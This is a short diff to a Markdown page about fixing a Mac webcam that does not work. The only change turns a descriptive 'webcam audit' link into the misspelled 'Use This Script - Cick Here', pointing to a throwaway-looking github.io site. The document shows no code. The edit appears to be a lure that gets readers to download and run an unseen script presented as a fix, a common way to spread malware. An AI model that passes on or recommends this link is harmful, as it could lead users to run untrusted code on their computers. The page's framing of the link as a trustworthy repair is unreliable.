@@ -6,7 +6,7 @@
 
 ## Mac Webcam Not Working — USB Bus Negotiation, Video Capture Architecture, and TCC Permission State
 
-> **[Full AVFoundation and USB device tree webcam audit](https://error-number-472173.github.io/.github/mac-webcam-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-webcam-not-working)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Webcam Not Working, in order of architectural impact:**
 
